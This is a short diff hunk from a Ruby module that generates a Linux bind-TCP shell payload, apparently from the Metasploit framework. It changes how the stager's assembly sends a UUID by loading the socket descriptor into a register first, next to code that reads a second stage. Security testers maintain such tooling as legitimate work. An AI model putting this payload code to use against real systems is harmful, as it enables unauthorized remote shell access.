@@ -145,7 +145,12 @@ module Payload::Linux::BindTcp
         xchg eax,ebx
     ^
 
-    asm << asm_send_uuid if include_send_uuid
+    if include_send_uuid
+      asm << %Q^
+        mov edi, ebx
+        #{asm_send_uuid}
+      ^
+    end
 
     asm << %Q^
         mov dh,0xc                    ; at least 0x0c00 bytes
